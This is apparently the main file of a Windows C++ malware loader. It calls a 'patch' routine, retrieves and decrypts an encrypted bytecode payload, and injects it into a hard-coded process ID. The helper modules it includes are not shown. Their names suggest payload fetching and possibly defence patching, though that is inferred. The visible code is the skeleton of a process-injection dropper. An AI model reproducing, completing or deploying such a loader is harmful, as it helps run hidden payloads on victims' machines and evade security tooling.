#include "decrypt/decrypt.hpp"
#include "patch/patch.hpp"
#include "retrieve/fetch.hpp"
#include "static/vars.hpp"

#include <cstdio>
// #include <iostream>
#include <vector>
#include <wincrypt.h>
#include "inject/inject.hpp"

int main() {
  patch();
  std::vector<unsigned char> bytecode = decrypt_bytecode(retrieve_bytecode());
  inject(bytecode, 5208);

  // std::cout << "Press Enter to exit...";
  // std::cin.get();

  return 0;
}
